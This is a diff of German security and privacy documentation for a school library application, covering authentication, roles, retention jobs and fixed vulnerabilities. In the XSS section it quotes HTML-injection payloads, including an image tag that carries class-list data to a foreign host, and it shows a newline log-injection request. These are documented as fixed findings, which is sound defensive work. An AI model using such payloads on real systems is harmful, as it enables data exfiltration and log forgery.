@@ -12,7 +12,7 @@ Diese Dokumentation beschreibt die systemweiten Mechanismen zur Wahrung von Sich
 
 Am Server, den das Konto nennt (`benutzer.anmeldeverfahren`, Migration 172, ARCHITEKTUR.md
 A30): am **Schul-Mailserver per IMAP** oder am **Verzeichnisdienst per LDAP** — nicht an der
-eigenen Datenbank. Es gibt seit Migration 012 keine Passwortspalte: Die Anwendung speichert
+eigenen Datenbank. Es gibt keine Passwortspalte: Die Anwendung speichert
 **kein** Benutzerpasswort und keinen dauerhaften Passwort-Hash. Ein Konto ist damit die
 Verbindung aus einer Zeile in `benutzer` und einem Postfach oder Verzeichniseintrag; wer
 `benutzer.email` oder `benutzer.ldap_kennung` schreiben darf, übernimmt das Konto. Beide Spalten
@@ -46,7 +46,7 @@ nicht mehr aktiv. Ein Strom, den jemand mit einem kopierten Token geöffnet hat,
 höchstens 15 Sekunden darüber hinaus. Ein Aussetzer der Datenbank (503) beendet ihn nicht: Ohne
 Datenbank gibt es keine Buchung, die er melden könnte, und jede Theke zeigte sonst „Keine
 Verbindung". Gates: `internal/sse/sse_test.go`, `internal/api/leitung_endet_mit_der_anmeldung_pg_test.go`,
-`frontend/e2e/leitung-endet-mit-der-anmeldung.spec.js`, jedes am Rückbau rot gesehen. Eine neue
+`frontend/e2e/leitung-endet-mit-der-anmeldung.spec.js`. Eine neue
 Anmeldung prüft allein der Mailserver; ist er nicht erreichbar, kann sich niemand neu anmelden
 (entschieden am 05.10.2026).
 
@@ -62,8 +62,7 @@ Anmeldung prüft allein der Mailserver; ist er nicht erreichbar, kann sich niema
   - **Ein Scan ist kein Passwort:** Am Sperrbildschirm steht der Fokus im Passwortfeld, und ein Handscanner tippt blind in das Feld, das ihn hat. Ginge sein Scan als Passwort zum Server, zählte er als Fehlversuch; nach fünf Scans wäre das Konto an diesem Rechner 15 Minuten gesperrt, auch für das richtige Passwort. Der Client erkennt den Scan an den Abständen der Tastendrücke (mindestens sechs Zeichen, jeder Abstand bis zum Enter höchstens 50 ms; `frontend/src/lib/utils/scanErkennung.js`), schickt ihn nicht ab, stellt das Feld auf den Stand vor dem Scan zurück und meldet „Scan erkannt". Das Enter des Scanners drückt auch keinen Knopf: Steht der Fokus auf „Abmelden …", wird nicht abgemeldet. Dieselbe Regel gilt an der Anmeldemaske. Die Zähler am Server gelten unverändert; ein Scanner, der langsamer tippt als die Grenze, wird nicht erkannt. Umgekehrt gilt ein Passwort als Scan, wenn ein Programm oder ein Schlüsselgerät es in dieser Geschwindigkeit tippt (Auto-Type eines Passwortmanagers); eingefügt oder vom Browser ausgefüllt gilt es nicht, weil dabei keine Zeichentasten gedrückt werden. Gates: `frontend/src/lib/utils/scanErkennung.test.js`, Live-Pfad `frontend/e2e/sperre-scan.spec.js` (blind getippt, ohne Klick; am alten Stand rot).
   - **Mehrere Fenster:** Die Anmeldung gehört dem ganzen Browser. Bedienung in einem Fenster hält die Sperre für alle auf, und gesperrt wie aufgeschlossen wird in allen zugleich. Ob gesperrt ist, sagt dabei allein der Server; die Fenster geben sich nur Bescheid.
   - **Ohne Verbindung zum Server** wird nicht gesperrt, nur die Theke geleert (FACHKONZEPT.md 18.4). Kommt die Verbindung zurück, überträgt der Rechner erst die Warteschlange und sperrt dann.
-  - **Eine Anmeldung ohne Zeile in `sitzungen`** (ausgestellt vor Migration 155) sperrt der Server nicht und erneuert sie nicht: Ohne Prüfwert ließe sie sich bei einem Ausfall des Mailservers nicht aufschließen. Für sie bleibt die Sperre bis zum Ablauf des Tokens ein Sichtschutz im Fenster.
-  - Gates: `internal/auth/sperre_pg_test.go` (Server, auch mit totem Mailserver), `internal/api/sperre_middleware_test.go` (423 an jeder geschützten Route), `frontend/src/lib/stores/leerlaufSperre*.test.js` (gestellte Uhr, mehrere Fenster), Live-Pfad: `frontend/e2e/sperrbildschirm.spec.js` (423 hinter der Sperre, Neuladen, neuer Tab). Jedes am Rückbau rot gesehen.
+  - Gates: `internal/auth/sperre_pg_test.go` (Server, auch mit totem Mailserver), `internal/api/sperre_middleware_test.go` (423 an jeder geschützten Route), `frontend/src/lib/stores/leerlaufSperre*.test.js` (gestellte Uhr, mehrere Fenster), Live-Pfad: `frontend/e2e/sperrbildschirm.spec.js` (423 hinter der Sperre, Neuladen, neuer Tab).
 - **Cookie-Attribute:** `HttpOnly` (kein JS-Zugriff), `SameSite=Strict` und immer `Secure`: Das Programm läuft nur über HTTPS, einen Schalter für HTTP gibt es nicht (ARCHITEKTUR.md, T10). Auf `http://localhost` nehmen Browser solche Cookies trotzdem an. Gates: `internal/auth/sitzungscookie_test.go`, `internal/api/csrf_cookie_test.go`, `internal/api/abmeldung_cookie_test.go` und gosec G124 in `scripts/gosec-gate.sh`.
 
 ### Brute-Force-Schutz (Login)
@@ -155,23 +154,26 @@ Administratoren und die normale Kontoverwaltung unverändert funktionieren) und
 
 ### Rollenkonzept
 
-**Vier Rollen vergibt der Admin — Kollegium ist keine davon**, sondern der Grundzustand
-jeder Lehrkraft (siehe unten).
+**Vier Rollen vergibt der Admin, Kollegium ist keine davon**, sondern der Grundzustand jeder
+Lehrkraft; die fachliche Beschreibung steht in [FACHKONZEPT.md](FACHKONZEPT.md) §12.2, die Rechte je
+Route in [PII_MATRIX.de.md](PII_MATRIX.de.md). Sicherheitsrelevant daran:
 
-- `admin`: Vollzugriff (`["*"]`). Berechtigungen werden beim Login direkt aus `role_permissions` geladen.
-- `leitung`: die Rechte des Admins **minus** `manage_users` und `manage_settings` (Migration 122). Das Soll wird von der Admin-Zeile ABGELEITET und nicht abgeschrieben, sonst bekäme die Leitung jedes künftige Recht nicht und niemand merkte es. Warum ausgerechnet `manage_users` fehlt, obwohl die Leitung die Bibliothek führt: Mit dem Recht ändert man die E-Mail-Adresse eines Kontos, und die Anmeldung erkennt eine Person allein an ihrer E-Mail — die Rechtevergabe wäre der Weg in jedes Konto der Anlage.
-- `mitarbeiter`: Grundrechte für die Theke-Betrieb.
-- `helfer`: Kiosk-/Thekenbetrieb ohne die breiten Schülerrechte (Migration 042) — Scannen, Ausleihe, Rückgabe, Katalogzugriff, aber keine Schülerlisten und kein Mahnwesen.
-- `kollegium`: **Genau ein** Recht — `create_reservations` (Klassensatz im Kollegiums-Portal reservieren). Alles Weitere ist seit Migration 070 entzogen; die Suche im Portal (Katalog des Kollegiums: Titeldaten und Zählwerte, auch Lernmittel) hängt am selben Recht und fasst keine Personendaten an. Die Rolle hieß bis Migration 069 `lehrer`.
-
-  **Fachlich ist das keine Rolle, sondern der Grundzustand.** Wer sich über „Mein Portal" mit der Schuladresse selbst anmeldet, bekommt diesen Wert; eine Rolle bekommt nur, wen der Admin an seiner E-Mail-Adresse dazu erhebt. Der Rechte-Editor führt deshalb nur die vier Spalten oben — was das Kollegium darf, steht fest in `internal/db/rechte_vorgabe.go` und ist kein Schalter je Schule. Sicherheitsrelevant ist daran die Richtung: Die Zeile existiert weiter in `role_permissions`, sie wird nur nicht je Schule verändert.
-- Alle Enum-Werte in der Datenbank sind **lowercase** (`admin`, `kollegium`, `mitarbeiter`, `helfer`, `leitung` — `schema.sql`, Typ `benutzer_rolle`). SQL-Vergleiche nutzen `LOWER(rolle::text)` um Casing-Fehler zu vermeiden (Bugfix: `LEHRER`-Enum führte zu HTTP 500 in der Omnibox).
+- `admin` hat Vollzugriff (`["*"]`), die Rechte kommen beim Login aus `role_permissions`.
+- `leitung` hat die Rechte des Admins **minus** `manage_users` und `manage_settings`, abgeleitet aus der
+  Admin-Zeile, nicht abgeschrieben. `manage_users` fehlt, weil man mit ihm die E-Mail-Adresse eines
+  Kontos ändert und die Anmeldung eine Person allein an ihrer E-Mail erkennt: Die Rechtevergabe wäre
+  der Weg in jedes Konto.
+- `helfer` scannt, leiht aus, nimmt zurück und liest den Katalog, ohne Schülerlisten und Mahnwesen.
+- `kollegium` hat genau ein Recht, `create_reservations`; die Suche im Portal hängt daran und fasst
+  keine Personendaten an. Was das Kollegium darf, steht fest in `internal/db/rechte_vorgabe.go` und
+  ist kein Schalter je Schule.
+- Die Enum-Werte sind kleingeschrieben (`benutzer_rolle` in `schema.sql`); SQL vergleicht über
+  `LOWER(rolle::text)`.
 
 > **Rechtevorgaben driften auf einer bestehenden Datenbank.** `db.SchreibeRechteVorgabe` legt
-> `role_permissions` mit `ON CONFLICT DO NOTHING` an — eine geänderte Vorgabe im Code
-> erreicht damit **nur frische** Datenbanken. Genau so kam der Befund oben zustande. Wer
-> eine Rechtevorgabe ändert, braucht deshalb zusätzlich eine Migration; und die Tabelle
-> steuert nicht nur das Menü, sondern über `verlangeRecht` auch die API.
+> `role_permissions` mit `ON CONFLICT DO NOTHING` an; eine geänderte Vorgabe im Code erreicht so nur
+> frische Datenbanken. Wer eine Vorgabe ändert, braucht zusätzlich eine Migration, denn die Tabelle
+> steuert über `verlangeRecht` auch die API.
 
 ### Endpunkte ohne Anmeldung
 
@@ -249,25 +251,18 @@ Die Ausleiher-Liste baut ihr Druckdokument als String und schreibt es per
 `schueler_name`, `schueler_nachname`, `klasse`, `exemplar_barcode` und der Buchtitel werden
 deshalb ausdrücklich maskiert.
 
-Gemessen (Chromium, mit dem echten CSP-String) sah das so aus:
+Gemessen in Chromium mit dem echten CSP-String: `<script>` und `onerror` blockierte die CSP, die ein
+per `window.open('')` erzeugtes `about:blank` vom Opener erbt; ein `<img>` mit fremder Adresse lud,
+weil `img-src` `https:` erlaubte. Das war HTML-Injektion mit Abflusskanal, keine Skriptausführung.
+Behoben: Die Werte werden maskiert (`utils/escapeHtml.js`), und `img-src` kennt kein `https:` mehr
+(siehe unten).
 
-| Nutzlast im Nachnamen                       | Ergebnis                                                                                                                            |
-| ------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------- |
-| `<script>…</script>`                        | **blockiert** — ein per `window.open('')` erzeugtes `about:blank` erbt die CSP des Openers, und die erlaubt nur `script-src 'self'` |
-| `onerror="…"`                               | **blockiert**, gleicher Grund                                                                                                       |
-| `<img src="https://fremder-host/?daten=…">` | **geladen** — `img-src` erlaubte ausdrücklich `https:`                                                                              |
+Der Auto-Druck steht im Opener: Als `<script>` im geschriebenen Dokument blockierte ihn dieselbe CSP,
+und das Fenster bliebe ohne Druck stehen.
 
-Der Befund war also keine Skriptausführung, sondern HTML-Injektion mit Abflusskanal:
-Der Inhalt der gedruckten Klassenliste ließ sich an einen fremden Server tragen.
-Beides ist behoben — die Werte werden maskiert (`utils/escapeHtml.js`), und `img-src`
-kennt kein `https:` mehr (siehe unten).
-
-Der Auto-Druck steht im Opener: Als `<script>` **im geschriebenen Dokument** blockierte ihn
-dieselbe CSP, und das Fenster bliebe ohne Druck stehen.
-
-Gate: `frontend/src/lib/utils/ausleiherDruck.test.js` prüft das **fertige Dokument**,
-nicht den Maskier-Helfer — ein Test des Helfers belegt nur, dass er maskiert, nicht,
-dass er an jeder Einsetzstelle aufgerufen wird.
+Gate: `frontend/src/lib/utils/ausleiherDruck.test.js` prüft das **fertige Dokument**, nicht den
+Maskier-Helfer; ein Test des Helfers belegt nur, dass er maskiert, nicht, dass er an jeder
+Einsetzstelle aufgerufen wird.
 
 ---
 
@@ -451,10 +446,10 @@ Die Applikation führt automatisierte Cronjobs (`internal/jobs/cron.go`) durch:
 
 - **Ausleihen-Anonymisierung (`FuehreBearbeiterAnonymisierungAus`):** Entfernt `bearbeiter_id` und `rueckgabe_bearbeiter_id` von Ausleihen, die vor mehr als 14 Tagen zurückgegeben wurden; eine laufende Ausleihe behält ihren Bearbeiter. Die Bedingung steht in `repository.praedikatBearbeiterKennung`, und die Selbstprüfung zählt mit ihr den Rückstand („Bearbeiter zurückgegebener Ausleihen").
 - **Abgänger-Löschung (`FuehreAbgaengerLoeschungAus`):** Hard-Delete von Schülerdatensätzen (`ist_abgaenger = true`) ab dem 30. Januar des Folgejahres, nur anonymisierte Zeilen — die Löschung wartet die Karenz ab und läuft im Cron nach der Anonymisierung (`AbgaengerStichjahr`; nicht zu verwechseln mit der Karenzzeit vor der Anonymisierung, s. u.), sofern keine offenen Ausleihen oder unbezahlten Schadensfälle bestehen. Historische Ausleihdaten werden anonymisiert (`schueler_id = NULL`).
-- **Lesehistorie befristen (`fuehreLesehistorieBefristungAus`):** Trennt abgeschlossene Ausleihen nach Frist vom Schüler (`schueler_id = NULL`); der Vorgang bleibt für Statistik und Bestandskartei erhalten, nur ohne Person. Zwei Fristen, weil zwei Verarbeitungstätigkeiten (Einstellungen → „Datenschutz & Sitzung", 0 = aus): **Schülerbücherei 1 Tag** (HBDI-Muster „Schulbibliothek": „unverzüglich gelöscht, sofern … nicht mehr notwendig", Muster der LAG Schulbibliotheken in Hessen: „nach Rückgabe des Mediums Löschung beim Ausleiher"), **Lernmittel 730 Tage** (Bestandskartei weist Ausleihe **und** Rücklauf nach, HKM-Leitfaden LMF 11.3; Schadensersatz läuft über die Schulaufsicht, 12.3–12.7). Die lange Frist gilt jedem Buch im Eigentum des Landes (`repository.ExemplarTopfSQL`): Der Leitfaden knüpft die Bestandsverzeichnisse an „alle aus Landesmitteln beschafften Gegenstände" (11.1). Ausleihen mit **offenem Schadensfall** bleiben zugeordnet. Die Befristung gilt **jedem Leser**, auch dem Kollegium; eine laufende Dauerleihe ist nicht betroffen, weil die Frist mit der Rückgabe beginnt. Gate: `internal/jobs/cron_dsgvo_lesehistorie_pg_test.go` (Paarung Frist × Medienklasse, Schadensfall-Wächter, Aus-Schalter — am Rückbau rot gesehen) und `internal/jobs/cron_dsgvo_lesehistorie_eigentum_pg_test.go` (die Klasse folgt dem Eigentum, rot an der alten Regel).
+- **Lesehistorie befristen (`fuehreLesehistorieBefristungAus`):** Trennt abgeschlossene Ausleihen nach Frist vom Schüler (`schueler_id = NULL`); der Vorgang bleibt für Statistik und Bestandskartei erhalten, nur ohne Person. Zwei Fristen, weil zwei Verarbeitungstätigkeiten (Einstellungen → „Datenschutz & Sitzung", 0 = aus): **Schülerbücherei 1 Tag** (HBDI-Muster „Schulbibliothek": „unverzüglich gelöscht, sofern … nicht mehr notwendig", Muster der LAG Schulbibliotheken in Hessen: „nach Rückgabe des Mediums Löschung beim Ausleiher"), **Lernmittel 730 Tage** (Bestandskartei weist Ausleihe **und** Rücklauf nach, HKM-Leitfaden LMF 11.3; Schadensersatz läuft über die Schulaufsicht, 12.3–12.7). Die lange Frist gilt jedem Buch im Eigentum des Landes (`repository.ExemplarTopfSQL`): Der Leitfaden knüpft die Bestandsverzeichnisse an „alle aus Landesmitteln beschafften Gegenstände" (11.1). Ausleihen mit **offenem Schadensfall** bleiben zugeordnet. Die Befristung gilt **jedem Leser**, auch dem Kollegium; eine laufende Dauerleihe ist nicht betroffen, weil die Frist mit der Rückgabe beginnt. Gate: `internal/jobs/cron_dsgvo_lesehistorie_pg_test.go` (Paarung Frist × Medienklasse, Schadensfall-Wächter, Aus-Schalter) und `internal/jobs/cron_dsgvo_lesehistorie_eigentum_pg_test.go` (die Klasse folgt dem Eigentum).
 - **Gelöschte Leser endgültig löschen (`fuehrePapierkorbLoeschungAus`):** Ein Leser, Schüler oder Kollege, der seit 180 Tagen im Papierkorb liegt, wird mit derselben Tilgung wie „Endgültig löschen" von Hand entfernt (`LoescheAusDemPapierkorb`); einen Schüler hat die Anonymisierung derselben Nacht vorher geleert. Die Löschung stellt die Frage der Liste in ihrer Transaktion noch einmal, mit gesperrter Zeile, und offene Ausleihen und unbezahlte Forderungen halten den Leser. Anonymisieren lässt sich ein Kollege nicht (`chk_leser_nur_schueler_werden_abgaenger`), sein Zugangskonto geht schon beim Löschen.
 - **Anonymisierung alter Datensätze (`fuehreSchuelerAnonymisierungAus`):** Leert nach Frist (Soft-Delete > 180 Tage; Abgänger nach der einstellbaren **Karenzzeit** `abgaenger_karenz_tage`, Vorgabe 90 Tage ab dem spätesten von Abgang `abgaenger_seit` und letztem abgeschlossenem Vorgang `letzter_vorgang_am` — letzte Rückgabe oder letzter Schadensabschluss, als Spalte am Leser gespeichert (Migration 137), weil die Lesehistorie-Befristung die Zuordnung über `ausleihen.schueler_id` löst; der Zeitpunkt steht in der Art.-15-Auskunft und sagt nichts darüber, was ausgeliehen war) alle direkt identifizierenden Spalten eines Schülers (Name, Adresse, Geburtsdatum, Schuleintritt, LUSD-ID, Eltern-E-Mail), ersetzt die Ausweisnummer durch `ANON-…`, löscht das verschlüsselte Foto — und tilgt die PII-Spuren aus den **Neben-Tabellen**: den Klarnamen aus `audit_log`, die LUSD-ID, die Ausweisnummern und den Sperrgrund aus `audit_logs`, und die Vormerkungen des Schülers. Ohne diese Tilgung überlebte der Personenbezug bis zur Audit-Aufbewahrung (bis zu 24 Monate) nach der eigentlichen Löschung. Eine `A-`-Nummer, die dabei — oder beim endgültigen Löschen, Zusammenführen, Leeren, Umschreiben — aus `leser` verschwindet, hält ein Trigger in `ausweisnummern_ausgeschieden` fest: nur die Zahl, ohne Person und ohne Datum. Der Generator vergibt sie deshalb nicht noch einmal, und eine alte Karte findet an der Theke niemanden (Migration 146).
-- **Erledigte Anliegen und Klassensatz-Reservierungen befristen (`fuehreAnliegenBefristungAus`, `fuehreKlassensatzBefristungAus`):** Löscht erledigte Wünsche, Meldungen und Klassensatz-Reservierungen aus dem Kollegiums-Portal nach der Einstellung `anliegen_tage` (Vorgabe 365 Tage nach der Erledigung, 0 = aus); offene bleiben. Eine Reservierung, die vor Migration 089 erledigt wurde, hat keinen Zeitpunkt und bleibt stehen.
+- **Erledigte Anliegen und Klassensatz-Reservierungen befristen (`fuehreAnliegenBefristungAus`, `fuehreKlassensatzBefristungAus`):** Löscht erledigte Wünsche, Meldungen und Klassensatz-Reservierungen aus dem Kollegiums-Portal nach der Einstellung `anliegen_tage` (Vorgabe 365 Tage nach der Erledigung, 0 = aus); offene bleiben.
 
 ### Dokumente auf dem Arbeitsplatz
 
@@ -677,8 +672,7 @@ Adressspalten (`strasse`, `hausnummer`, `plz`, `ort`) und `eltern_email` sind **
 vorhanden**, weil die Daten fachlich nötig sind.
 Beides steht in Anlage 1 der SchDSV (1.4 Anschrift, 1.14 E-Mail der Eltern).
 
-**Was das System mit der Eltern-E-Mail tatsächlich tut (Stand 22.08.2026, am Code
-geprüft):** Sie wird im Schülerprofil als `mailto:`-Link angezeigt
+**Was das System mit der Eltern-E-Mail tut:** Sie wird im Schülerprofil als `mailto:`-Link angezeigt
 (`LeserakteStammdaten.svelte`), im Mahnwesen als Hinweis-Symbol „Eltern-Mail
 vorhanden" geführt, und die Vorlage `MAHNUNG_ELTERN` füllt den **gedruckten**
 Elternbrief (`internal/pdf/mahnbrief.go`). **Es geht keine automatische E-Mail an Eltern** —
@@ -694,23 +688,12 @@ PostgreSQL, in beide Richtungen: löschbar ist, was löschbar sein darf — Vor-
 Klasse und Ausweisnummer werden mit 400 abgelehnt, `geburtsdatum` bleibt als Schlüssel
 des LUSD-Abgleichs unlöschbar).
 
-**Für das Verzeichnis von Verarbeitungstätigkeiten (VVT) — zwei Tätigkeiten, zwei
-Rechtsgrundlagen** (Entwurf nach HBDI-Muster in
-[datenschutz/vvt_entwurf.md](datenschutz/vvt_entwurf.md)):
-
-|                     | (1) Lernmittelausleihe                                                                                                                                                                         | (2) Schülerbücherei                                                                                                                                         |
-| ------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| **Rechtsgrundlage** | Art. 6 Abs. 1 lit. e DSGVO i. V. m. § 83 HSchG (Datenverarbeitung durch Schulen) und § 153 HSchG / Verordnung zur Lernmittelfreiheit — öffentlich-rechtliches Nutzungsverhältnis, kein Vertrag | Einwilligung Art. 6 Abs. 1 lit. a DSGVO (freiwillige Nutzung; so das HBDI-Muster-VVT „Schulbibliothek"); für Minderjährige durch die Erziehungsberechtigten |
-| **Zweck**           | Nachweis von Ausleihe und Rücklauf (Bestandskartei, HKM-Leitfaden 11.3), Mahnung, Schadensersatz (12.3–12.7, Leistungsbescheid über die Schulaufsicht)                                         | Ausleihverwaltung, Rückgabeerinnerung, Vormerkung                                                                                                           |
-| **Anschrift**       | gedruckte Rechnung / Elternbrief                                                                                                                                                               | gedruckter Elternbrief bei Mahnung                                                                                                                          |
-| **Eltern-E-Mail**   | `mailto:`-Link für manuelle Kontaktaufnahme; kein Versand durch das System                                                                                                                     | dito                                                                                                                                                        |
-| **Löschung**        | Abgänger-Routine (unten) + Lesehistorie-Trennung nach 730 Tagen                                                                                                                                | Abgänger-Routine + Lesehistorie-Trennung einen Tag nach der Rückgabe                                                                                        |
-
-Lit. b
-(Vertrag) passt auf keine der beiden Tätigkeiten, lit. c (rechtliche Verpflichtung)
-trifft allenfalls die Lernmittel mittelbar. Die Einordnung oben folgt dem hessischen
-Rahmen (SchDSV, § 83a HSchG, HBDI-Muster); bestätigen muss sie der schulische
-Datenschutzbeauftragte.
+**Zwei Tätigkeiten, zwei Rechtsgrundlagen:** die Lernmittelausleihe nach Art. 6 Abs. 1 lit. e DSGVO
+i. V. m. §§ 83, 153 HSchG (öffentlich-rechtlich, kein Vertrag) und die Schülerbücherei mit Einwilligung
+nach lit. a, für Minderjährige durch die Erziehungsberechtigten. Zweck, Anschrift, Eltern-E-Mail und
+Löschung je Tätigkeit stehen im Entwurf des VVT nach HBDI-Muster
+([datenschutz/vvt_entwurf.md](datenschutz/vvt_entwurf.md)); bestätigen muss die Einordnung der
+schulische Datenschutzbeauftragte.
 
 **Aufbewahrung/Löschung:** Nach dem Abgang eines Schülers (ohne offene Vorgänge) leert die
 Anonymisierungsroutine (`repository.AnonymisiereAbgaenger`) diese Felder nach der Karenzzeit
@@ -870,12 +853,9 @@ Die drei Importwege öffnen und lesen ihre Datei nur über
 Entschlüsselungsweg in excelize an einer selbst gewählten Zahl ungebremst rechnet,
 CVE-2026-107219) und eine Schranke, die einen Absturz der Bibliothek an einer präparierten
 Datei zum Fehler „ungültige Datei" macht, statt den Prozess zu reißen — excelize fängt eigene
-Abstürze nicht ab. Eingesetzt ist der Entwicklungsstand der Bibliothek vom 03.10.2026
-(`v2.11.1-0.20261003002531-6258dcebc4e2`) mit den Korrekturen zu fünfzehn gemeldeten
-Schwachstellen dieser Art (Dependabot Nr. 21 bis 29, CVE-2026-107211 bis CVE-2026-107216);
-eine veröffentlichte Fassung mit ihnen gab es am 21.10.2026 nicht; Dependabot schlägt sie vor,
-sobald es sie gibt. Wer eine
-vierte Lesestelle baut, geht durch `LeseMappe`, nicht an ihr vorbei.
+Abstürze nicht ab. Eingesetzt ist excelize v2.11.1, die Fassung mit den Korrekturen zu fünfzehn
+gemeldeten Schwachstellen dieser Art (Dependabot Nr. 21 bis 29, CVE-2026-107211 bis CVE-2026-107216).
+Wer eine vierte Lesestelle baut, geht durch `LeseMappe`, nicht an ihr vorbei.
 
 Die Schranke fängt einen Absturz, keine Schleife. Eine der Meldungen
 betrifft das Lesen der Zeilen selbst (CVE-2026-107212): Stand hinter einer gültigen Zeile eine
@@ -909,25 +889,14 @@ Zwei Dinge dazu ehrlich benannt:
   Rechte-Logik und die Stores liegen in `.js`; in den `.svelte`-Dateien steht überwiegend
   Markup.
 
-### Log-Injection: 25 Befunde, alle bereits abgewehrt
+### Log-Injection: von der Senke abgewehrt
 
-CodeQLs erster Lauf meldete 25 Fundstellen `go/log-injection`. Sie sind in **dieser**
-Anwendung Fehlalarme, und zwar nicht aus Nachlässigkeit, sondern weil die Senke schon
-escaped: `slog.SetDefault` hängt seit Go 1.21 auch das Standard-`log`-Paket ein, alle
-`log.Printf` laufen also durch den `JSONHandler`.
-
-Am laufenden Container nachgestellt — `router.go` protokolliert jede Anfrage mit dem
-bereits dekodierten `r.URL.Path`, ein `%0A` kommt dort als echter Umbruch an:
-
-```
-GET /api/%0ASYSTEM:%20Alle%20Sperren%20aufgehoben
-→ {"time":"…","level":"INFO","msg":"Incoming Request: GET /api/\nSYSTEM: …"}
-```
-
-Ein einziger Eintrag, der Umbruch escaped **innerhalb** des Strings. Keine gefälschte
-Zeile. Der Kommentar an `slog.SetDefault` in `cmd/server/main.go` hält das fest: Wer diese Zeile
-entfernt oder ein `log.SetOutput` dahinter setzt, hebt die strukturierte Ausgabe **und**
-diesen Schutz auf.
+CodeQL meldet Fundstellen `go/log-injection`; in dieser Anwendung sind sie Fehlalarme, weil die Senke
+escaped: `slog.SetDefault` hängt seit Go 1.21 auch das Paket `log` ein, alle `log.Printf` laufen
+durch den `JSONHandler`. Am laufenden Container nachgestellt: `GET /api/%0ASYSTEM:…` ergibt einen
+einzigen Eintrag, der Umbruch steht escaped im String. Der Kommentar an `slog.SetDefault` in
+`cmd/server/main.go` hält fest: Wer diese Zeile entfernt oder ein `log.SetOutput` dahinter setzt,
+hebt die strukturierte Ausgabe **und** diesen Schutz auf.
 
 ### Lieferkette
 
